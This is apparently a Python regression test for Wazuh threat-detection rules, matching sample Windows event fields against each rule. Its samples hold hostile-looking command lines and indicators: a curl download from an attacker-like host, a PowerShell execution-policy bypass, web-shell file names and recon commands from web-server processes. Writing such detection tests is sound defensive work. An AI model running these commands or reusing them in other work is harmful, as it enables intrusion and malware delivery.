"""Regression tests for the Emerging Threats rule patterns.

Checks each rule's <field> conditions against Wazuh-style sample values. It
can't replace wazuh-logtest, but it catches regex and escaping mistakes in CI.

Wazuh's eventchannel decoder keeps Windows path backslashes doubled, so sample
values use '\\\\' (two backslash characters) per separator, like alerts.json.
Every rule's fields must all match (respecting negate) for a positive sample
and at least one must fail for a negative sample.

    python tools/test_emerging_threats.py
"""
import re
import sys
import xml.etree.ElementTree as ET
from pathlib import Path

HERE = Path(__file__).resolve().parent
sys.path.insert(0, str(HERE))
from validate_rules import python_compatible  # noqa: E402

PATH = HERE.parent / "Emerging Threats" / "150000-emerging_threats.xml"
root = ET.fromstring("<root>" + PATH.read_text(encoding="utf-8").split("-->", 1)[1] + "</root>")
rules = {r.get("id"): r for r in root.iter("rule")}


def W(p):
    """Render a Windows path the way Wazuh stores it (doubled backslashes)."""
    return p.replace("\\", "\\\\")


def matches(rid, event):
    for f in rules[rid].findall("field"):
        name = f.get("name")
        if name not in event:
            if f.get("negate") == "yes":
                continue
            return False
        pat = f.text.strip()
        hit = bool(re.search(python_compatible(pat), event[name])) if f.get("type") == "pcre2" else bool(re.search(pat, event[name]))
        if f.get("negate") == "yes":
            hit = not hit
        if not hit:
            return False
    return True


E = "win.eventdata."
cases = [
    # (rule, expected, event)
    ("150031", True, {E + "image": W(r"C:\Windows\System32\wscript.exe"), E + "currentDirectory": W("E:\\")}),
    ("150031", False, {E + "image": W(r"C:\Windows\System32\wscript.exe"), E + "currentDirectory": W("C:\\")}),
    ("150060", True, {"win.system.eventID": "5145", E + "shareName": W(r"\\*\ADMIN$"), E + "relativeTargetName": "svc.exe"}),
    ("150060", False, {"win.system.eventID": "5145", E + "shareName": W(r"\\*\IPC$"), E + "relativeTargetName": "svc.exe"}),
    ("150011", True, {E + "image": W(r"C:\Users\bob\AppData\Roaming\nsm\client32.exe")}),
    ("150011", False, {E + "image": W(r"C:\Program Files (x86)\NetSupport\NetSupport Manager\client32.exe")}),
    ("150070", True, {E + "targetFilename": W(r"C:\Program Files\Common Files\Microsoft Shared\Web Server Extensions\16\TEMPLATE\LAYOUTS\spinstall0.aspx")}),
    ("150070", False, {E + "targetFilename": W(r"C:\Program Files\Common Files\Microsoft Shared\Web Server Extensions\16\TEMPLATE\LAYOUTS\start.aspx")}),
    ("150071", True, {E + "image": W(r"c:\windows\system32\inetsrv\w3wp.exe"), E + "targetFilename": W(r"C:\Program Files\Common Files\Microsoft Shared\Web Server Extensions\15\TEMPLATE\LAYOUTS\x\shell.aspx")}),
    ("150071", False, {E + "image": W(r"C:\Program Files\Microsoft Office Servers\16.0\Bin\psconfig.exe"), E + "targetFilename": W(r"C:\Program Files\Common Files\Microsoft Shared\Web Server Extensions\16\TEMPLATE\LAYOUTS\a.aspx")}),
    ("150072", True, {E + "parentImage": W(r"c:\windows\system32\inetsrv\w3wp.exe"), E + "image": W(r"C:\Windows\System32\cmd.exe"), E + "commandLine": "cmd /c whoami"}),
    ("150072", True, {E + "parentImage": W(r"C:\apache-tomcat-9.0\bin\java.exe"), E + "image": W(r"C:\Windows\System32\nltest.exe"), E + "commandLine": "nltest /dclist:"}),
    ("150072", False, {E + "parentImage": W(r"C:\Program Files\Java\bin\java.exe"), E + "image": W(r"C:\Windows\System32\cmd.exe"), E + "commandLine": "cmd /c build"}),
    ("150072", False, {E + "parentImage": W(r"C:\ManageEngine\jre\bin\tomcat\java.exe"), E + "image": W(r"C:\Windows\System32\sc.exe"), E + "commandLine": W(r"sc query ADManager Plus")}),
    ("150073", True, {E + "parentImage": W(r"C:\Program Files (x86)\ScreenConnect\ScreenConnect.Service.exe"), E + "image": W(r"C:\Windows\System32\cmd.exe")}),
    ("150073", False, {E + "parentImage": W(r"C:\Program Files (x86)\ScreenConnect Client (abc)\ScreenConnect.ClientService.exe"), E + "image": W(r"C:\Windows\System32\cmd.exe")}),
    ("150074", True, {E + "parentImage": W(r"C:\Program Files\PaperCut MF\server\bin\win\pc-app.exe"), E + "image": W(r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe")}),
    ("150075", True, {E + "parentImage": W(r"C:\Program Files\Update Services\Services\WsusService.exe"), E + "image": W(r"C:\Windows\System32\cmd.exe")}),
    ("150076", True, {E + "parentCommandLine": W(r'c:\windows\system32\inetsrv\w3wp.exe -ap "WsusPool" -v "v4.0"'), E + "image": W(r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe")}),
    ("150076", False, {E + "parentCommandLine": W(r'c:\windows\system32\inetsrv\w3wp.exe -ap "DefaultAppPool"'), E + "image": W(r"C:\Windows\System32\cmd.exe")}),
    ("150080", True, {"win.system.eventID": "4886", E + "attributes": "cdc:dc01.corp.local\nrmd:ws22.corp.local"}),
    ("150080", False, {"win.system.eventID": "4886", E + "attributes": "CertificateTemplate:User"}),
    ("150081", True, {"win.system.eventID": "4887", E + "attributes": "rmd:ghost01.corp.local"}),
    ("150082", True, {"win.system.eventID": "4741", E + "targetUserName": "GHOST-7F2A$"}),
    ("150082", False, {"win.system.eventID": "4741", E + "targetUserName": "WS-0042$"}),
    ("150083", True, {E + "targetFilename": W(r"C:\Windows\Temp\RS-{1B2C3D4E-0000}\TieringEngineService.exe")}),
    ("150083", False, {E + "targetFilename": W(r"C:\Windows\System32\TieringEngineService.exe")}),
    ("150084", True, {E + "pipeName": W(r"\REDSUN")}),
    ("150084", False, {E + "pipeName": W(r"\REDSUNSET")}),
    ("150085", True, {E + "parentImage": W(r"C:\Windows\Temp\RS-{x}\TieringEngineService.exe"), E + "image": W(r"C:\Windows\System32\conhost.exe"), E + "user": W(r"NT AUTHORITY\SYSTEM")}),
    ("150086", True, {E + "image": W(r"C:\Program Files\WindowsApps\Microsoft.ScreenSketch\SnippingTool\SnippingTool.exe"), E + "commandLine": W(r'"SnippingTool.exe" ms-screensketch:edit?&filePath=\\10.0.0.5\share\a.png')}),
    ("150086", True, {E + "image": W(r"C:\x\SnippingTool.exe"), E + "commandLine": "SnippingTool.exe ms-screensketch:edit?&filePath=%5C%5Cevil%5Cx"}),
    ("150086", False, {E + "image": W(r"C:\x\SnippingTool.exe"), E + "commandLine": W(r"SnippingTool.exe ms-screensketch:edit?&filePath=C:\Users\a\b.png")}),
    ("150087", True, {"win.system.message": "Faulting application name: lsass.exe, version: 10.0.20348.1\r\nFaulting module name: netlogon.dll, version: 10.0\r\nException code: 0xc0000409"}),
    ("150087", False, {"win.system.message": "Faulting application name: chrome.exe\r\nFaulting module name: netlogon.dll\r\nException code: 0xc0000409"}),
    ("150090", True, {E + "commandLine": W(r'cmd.exe /c cscript "C:\Users\a\AppData\Local\Temp\6202033.vbs" //nologo && del "C:\Users\a\AppData\Local\Temp\6202033.vbs"')}),
    ("150090", True, {E + "commandLine": "curl.exe -s http://sfrclak.com:8000/6202033"}),
    ("150090", True, {E + "commandLine": W(r'"C:\ProgramData\wt.exe" -w hidden -ep bypass -file C:\x.ps1')}),
    ("150091", True, {E + "image": W(r"C:\Program Files\nodejs\node.exe"), E + "targetFilename": W(r"C:\ProgramData\wt.exe")}),
    ("150091", True, {E + "image": W(r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"), E + "targetFilename": W(r"C:\Users\a\AppData\Local\Temp\6202033.ps1")}),
    ("150091", False, {E + "image": W(r"C:\Program Files\nodejs\node.exe"), E + "targetFilename": W(r"C:\ProgramData\other.exe")}),
    ("150092", True, {E + "queryName": "git-tanstack.com"}),
    ("150092", False, {E + "queryName": "www.tanstack.com"}),
    ("150093", True, {E + "queryName": "filev2.getsession.org", E + "image": W(r"C:\Program Files\nodejs\node.exe")}),
    ("150093", False, {E + "queryName": "filev2.getsession.org", E + "image": W(r"C:\Users\a\AppData\Local\Programs\Session\Session.exe")}),
    ("150094", True, {E + "targetFilename": W(r"C:\Users\a\.claude\router_runtime.js")}),
    ("150094", True, {E + "targetFilename": W(r"C:\src\app\node_modules\x\tanstack_runner.js")}),
    ("150094", False, {E + "targetFilename": W(r"C:\src\app\router.js")}),
    ("150095", True, {E + "image": W(r"C:\Users\a\.bun\bin\bun.exe"), E + "commandLine": "bun run tanstack_runner.js"}),
]

failed = 0
for rid, expected, event in cases:
    got = matches(rid, event)
    if got != expected:
        failed += 1
        print(f"FAIL {rid}: expected {expected}, got {got} for {event}")
print(f"{len(cases) - failed}/{len(cases)} cases passed")
sys.exit(1 if failed else 0)
